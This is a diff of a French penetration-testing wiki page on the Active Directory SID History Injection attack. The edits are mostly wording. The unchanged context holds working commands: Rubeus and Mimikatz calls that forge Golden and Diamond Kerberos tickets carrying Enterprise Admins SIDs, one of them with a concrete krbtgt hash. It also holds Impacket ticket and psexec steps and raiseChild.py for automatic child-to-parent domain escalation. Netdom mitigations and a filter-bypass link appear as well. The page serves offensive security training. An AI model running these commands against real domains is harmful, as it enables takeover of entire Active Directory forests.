@@ -4,27 +4,27 @@
 
 ## SID History Injection Attack
 
-L'objectif du **SID History Injection Attack** est de faciliter la **migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est réalisé en **intégrant l'ancien Security Identifier (SID) de l'utilisateur dans le SID History** de son nouveau compte. Il est important de noter que ce processus peut être détourné afin d'accorder un accès non autorisé, en ajoutant le SID d'un groupe hautement privilégié (tel que Enterprise Admins ou Domain Admins) du domaine parent au SID History. Cette exploitation donne accès à toutes les ressources du domaine parent.<sup>[[1]](#references)[[2]](#references)</sup>
+L'objectif de l'**SID History Injection Attack** est de faciliter la **migration des utilisateurs entre les domaines** tout en garantissant un accès continu aux ressources de l'ancien domaine. Cela est réalisé en **intégrant l'ancien Security Identifier (SID) de l'utilisateur dans le SID History** de son nouveau compte. Il est à noter que ce processus peut être manipulé afin d'accorder un accès non autorisé, en ajoutant le SID d'un groupe disposant de privilèges élevés (comme Enterprise Admins ou Domain Admins) du domaine parent au SID History. Cette exploitation permet d'accéder à toutes les ressources du domaine parent.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Deux méthodes permettent d'exécuter cette attaque : la création d'un **Golden Ticket** ou d'un **Diamond Ticket**.
+Deux méthodes permettent d'exécuter cette attaque : par la création d'un **Golden Ticket** ou d'un **Diamond Ticket**.
 
-Pour trouver le SID du groupe **"Enterprise Admins"**, il faut d'abord identifier le SID du domaine racine. Une fois celui-ci identifié, le SID du groupe Enterprise Admins peut être construit en ajoutant `-519` au SID du domaine racine. Par exemple, si le SID du domaine racine est `S-1-5-21-280534878-1496970234-700767426`, le SID du groupe "Enterprise Admins" sera `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Pour déterminer le SID du groupe **"Enterprise Admins"**, il faut d'abord trouver le SID du domaine racine. Une fois celui-ci identifié, le SID du groupe Enterprise Admins peut être construit en ajoutant `-519` au SID du domaine racine. Par exemple, si le SID du domaine racine est `S-1-5-21-280534878-1496970234-700767426`, le SID obtenu pour le groupe "Enterprise Admins" serait `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
 Vous pouvez également utiliser les groupes **Domain Admins**, dont le SID se termine par **512**.
 
-Une autre manière de trouver le SID d'un groupe de l'autre domaine (par exemple "Domain Admins") consiste à utiliser :
+Une autre façon de trouver le SID d'un groupe de l'autre domaine (par exemple, "Domain Admins") est la suivante :
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Notez qu'il est possible de désactiver l'historique SID dans une relation d'approbation, ce qui fera échouer cette attaque.
+> Notez qu'il est possible de désactiver SID history dans une relation d'approbation, ce qui fera échouer cette attaque.
 
 Selon la [**documentation**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
 - **Désactiver SIDHistory sur les approbations de forêt** à l'aide de l'outil netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Appliquer le SID Filter Quarantining aux approbations externes** à l'aide de l'outil netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Appliquer le SID Filtering aux approbations de domaine au sein d'une même forêt** n'est pas recommandé, car il s'agit d'une configuration non prise en charge pouvant entraîner des changements incompatibles. Si un domaine d'une forêt n'est pas digne de confiance, il ne devrait pas être membre de cette forêt. Dans ce cas, il est nécessaire de séparer d'abord les domaines de confiance et non fiables dans des forêts distinctes, où le SID Filtering pourra être appliqué à une approbation interforêts.
+- **Appliquer SID Filter Quarantining aux approbations externes** à l'aide de l'outil netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Appliquer SID Filtering aux approbations de domaines au sein d'une même forêt** n'est pas recommandé, car il s'agit d'une configuration non prise en charge qui peut entraîner des changements incompatibles. Si un domaine au sein d'une forêt n'est pas fiable, il ne devrait pas être membre de la forêt. Dans cette situation, il est nécessaire de séparer d'abord les domaines approuvés et non fiables dans des forêts distinctes, où SID Filtering peut être appliqué à une approbation interforêt
 
-Consultez cet article pour plus d'informations sur le contournement de ce mécanisme : [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Consultez cet article pour plus d'informations sur le bypass de cette protection : [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) avec KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Escalate vers le DA du root ou l’Enterprise admin en utilisant le hash KRBTGT du domaine compromis :
+Escalade vers le DA du domaine root ou l’Enterprise Admin à l’aide du hash KRBTGT du domaine compromis :
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -120,28 +120,29 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatiquement avec [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatique avec [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Il s'agit d'un script Impacket qui va **automatiser l'escalade du domaine enfant vers le domaine parent**. Le script nécessite :
+Il s'agit d'un script Impacket qui va **automatiser l'escalade du child domain vers le parent domain**. Le script nécessite :
 
 - Le contrôleur de domaine cible
-- Les identifiants d'un utilisateur administrateur du domaine enfant
+- Les creds d'un utilisateur admin dans le child domain
 
-Le processus est le suivant :
+Le déroulement est le suivant :
 
-- Obtient le SID du groupe Enterprise Admins du domaine parent
-- Récupère le hash du compte KRBTGT dans le domaine enfant
+- Obtient le SID du groupe Enterprise Admins du parent domain
+- Récupère le hash du compte KRBTGT dans le child domain
 - Crée un Golden Ticket
-- Se connecte au domaine parent
-- Récupère les identifiants du compte Administrator dans le domaine parent
-- Si le switch `target-exec` est spécifié, s'authentifie auprès du contrôleur de domaine du domaine parent via Psexec.
+- Se connecte au parent domain
+- Récupère les credentials du compte Administrator dans le parent domain
+- Si le switch `target-exec` est spécifié, s'authentifie auprès du contrôleur de domaine du parent domain via Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Références
 
-- [1] [Persistance furtive dans Active Directory #14 : SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [Qu'est-ce qu'un Security Identifier (SID) ? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Considérations de sécurité pour les relations d'approbation - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [Qu’est-ce qu’un Security Identifier (SID) ? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Considérations de sécurité pour les relations d’approbation - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Sid Filter comme frontière de sécurité entre les domaines, partie 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
